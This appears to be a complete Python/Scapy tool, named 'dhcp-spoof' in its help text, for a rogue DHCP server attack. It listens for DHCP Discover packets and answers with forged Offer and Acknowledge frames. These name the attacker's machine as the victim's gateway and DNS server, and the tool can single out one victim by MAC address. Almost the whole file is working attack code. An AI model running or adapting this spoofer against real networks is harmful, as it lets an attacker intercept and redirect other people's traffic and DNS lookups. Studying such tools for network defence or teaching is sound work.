#!/usr/bin/python3

import logging
import importlib
import sys

# Suppress Scapy warnings before importing
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from sys import argv, exit
import re
import socket

# Globals
my_mac=None
my_ip=None
assign_ip=None
target_mac=''

# Constants

ETHER_BROADCAST     = 'ff:ff:ff:ff:ff:ff'
IP_BROADCAST        = '255.255.255.255'
DHCP_CLIENT_PORT    = 68 
DHCP_SERVER_PORT    = 67


class DHCP_FLAGS:
    # OP
    BOOTREQUEST=1
    BOOTREPLY=2

    # htype
    HTYPE_DEF=1

    # hlen
    HTYPE_LEN_DEF=6


# Checks if a packet has DHCP layers
def is_dhcp_layers(pack):
    # Filter by layers
    return pack.haslayer(DHCP) and pack.haslayer(BOOTP) and pack.haslayer(UDP)\
    and pack.haslayer(IP) and pack.haslayer(Ether)


# Checks if a packet is DHCP type discover
def is_discover_filter(pack):
    if is_dhcp_layers(pack):
        # Check ports
        if pack[UDP].sport == DHCP_CLIENT_PORT and pack[UDP].dport == DHCP_SERVER_PORT:
            # Check if broadcast
            if pack[Ether].dst == 'ff:ff:ff:ff:ff:ff' and  pack[IP].dst == IP_BROADCAST:
                opts = pack[DHCP].options
                return opts[0][1] == DHCP_FLAGS.BOOTREQUEST

    return False


def import_scapy():
    globals().update(importlib.import_module('scapy.all').__dict__)


def is_mac_valid(x):
    return bool(re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower()))


def is_ip_valid(x):
    try:
        socket.inet_aton(x)
        return True
    except:
        pass
    
    return False


mac_to_bytes = lambda mac: (eval('0x'+''.join([x for x in mac if x != ':']))).to_bytes(6, byteorder='big')


def print_help():
    print('dhcp-spoof attacker_mac attacker_ip unused_ip [flags]')
    print('')
    print('Arguments')
    print('\tattacker_mac - MAC address of attacker')
    print('\tattacker_ip - IP to set as default gateway')
    print('\tunused_ip - IP to assign for victim')
    print('')
    print('Flags: ')
    print('\t-h,  help')
    print('\t-t,  target - MAC address of specific victim you want to attack')
    print('\t--dns,  - redirect victim DNS queries to this machine')


def build_offer_message(discover, my_mac, my_ip, free_ip):
    to_mac = discover[Ether].src

    # Add Ether
    frame = Ether(src=my_mac, dst=to_mac)

    # Add IP with the free address
    frame /= IP(src=my_ip, dst=free_ip)

    # Add Transportation layer
    frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)

    # Add legacy BOOTP layer
    frame /= BOOTP()

    # Change BOOTP options
    frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
    frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
    frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
    frame[BOOTP].xid = discover[BOOTP].xid
    frame[BOOTP].secs = 0
    frame[BOOTP].flags = None
    frame[BOOTP].ciaddr = '0.0.0.0'
    frame[BOOTP].yiaddr = free_ip
    frame[BOOTP].siaddr = my_ip
    frame[BOOTP].giaddr = '0.0.0.0'
    frame[BOOTP].chaddr = mac_to_bytes(discover[Ether].src)

    # Add DHCP Extension
    frame /= DHCP()

    # Change DHCP fields
    
    opts = [('message-type', 2),\
            ('server_id', my_ip),\
            ('lease_time', 43200),\
            ('renewal_time', 21600),\
            ('rebinding_time', 37800),\
            ('subnet_mask', '255.255.255.0'),\
            ('broadcast_address', '192.168.1.255'),\
            ('router', my_ip),\
            ('name_server', my_ip),\
            ('domain', b'lan'),\
            'end']\

    # Write options
    frame[DHCP].options = opts

    return frame


def build_acknowledge_message(request, my_mac, my_ip, assigned_ip):
    to_mac = request[Ether].src

    # Add Ether
    frame = Ether(src=my_mac, dst=to_mac)

    # Add IP with the free address
    frame /= IP(src=my_ip, dst=assigned_ip)

    # Add Transportation layer
    frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)

    # Add legacy BOOTP layer
    frame /= BOOTP()

    # Change BOOTP options
    frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
    frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
    frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
    frame[BOOTP].xid = request[BOOTP].xid
    frame[BOOTP].secs = 0
    frame[BOOTP].flags = None
    frame[BOOTP].ciaddr = '0.0.0.0'
    frame[BOOTP].yiaddr = assigned_ip
    frame[BOOTP].siaddr = my_ip
    frame[BOOTP].giaddr = '0.0.0.0'
    frame[BOOTP].chaddr = mac_to_bytes(request[Ether].src)

    # Add DHCP Extension
    frame /= DHCP()

    # Change DHCP fields
    req_opts = request[DHCP].options
    comp_name = ''

    for x in req_opts:
        if x[0].lower() == 'client_fqdn':
            comp_name = x[1]
            break
    
    if comp_name == '':
        return None

    # TODO: Check if needed to tuncate non-printable charecters for comp_name
    
    opts = [('message-type', 5),\
            ('server_id', my_ip),\
            ('lease_time', 43200),\
            ('renewal_time', 21600),\
            ('rebinding_time', 37800),\
            ('subnet_mask', '255.255.255.0'),\
            ('broadcast_address', '192.168.1.255'),\
            ('router', my_ip),\
            ('name_server', my_ip),\
            ('domain', b'lan'),\
            ('client_FQDN', comp_name),\
            'end']

    # Write options
    frame[DHCP].options = opts

    return frame


def gen_request_filter(xid, src_mac):
    return lambda pack: pack.haslayer(BOOTP) and pack[BOOTP].xid == xid and pack.haslayer(Ether) and pack[Ether].src == src_mac


# Prints an example discovery
def handle_DHCP_discover(pack):
    global my_mac, my_ip, target_mac
   
    print('Got Discover from ----> ', end='')
    print(pack[Ether].src)

    do_packet = target_mac == '' or target_mac == pack[Ether].src

    if do_packet:
        print('=-=-=-=- Sending Offer =-=-=-=-')

        # TODO: Check for free ip (in different function)

        # Send offer
        current_offer = build_offer_message(pack, my_mac, my_ip, assign_ip)
        sendp(current_offer)

        # Build filter func
        req_filt = gen_request_filter(pack[BOOTP].xid, pack[Ether].src)

        # Sniff for request
        request = sniff(lfilter=req_filt, count=1, timeout=1)[0]

        # Send acknowledge
        print('=-=-=-=- Sending Acknowledge =-=-=-=-')
        ack = build_acknowledge_message(request, my_mac, my_ip, assign_ip)
        sendp(ack)

        exit(0)


def main():
    global my_mac, my_ip, assign_ip, target_mac

    if len(sys.argv) < 4 or '-h' in sys.argv:
        print_help()
    else:
        my_mac, my_ip = sys.argv[1], sys.argv[2]

        assign_ip = sys.argv[3]

        # Check for specific target
        if '-t' in argv:
            try:
                target_mac = argv[argv.index('-t') + 1]
            except:
                print('Target not specified')
                exit(1)

        if not(is_mac_valid(my_mac) and is_ip_valid(my_ip) and is_ip_valid(assign_ip)):
            print('Invalid IP or MAC')
            exit(1)

        import_scapy()

        print('Listening...')
        sniff(lfilter=is_discover_filter, prn=handle_DHCP_discover)


if __name__ == "__main__":
    main()
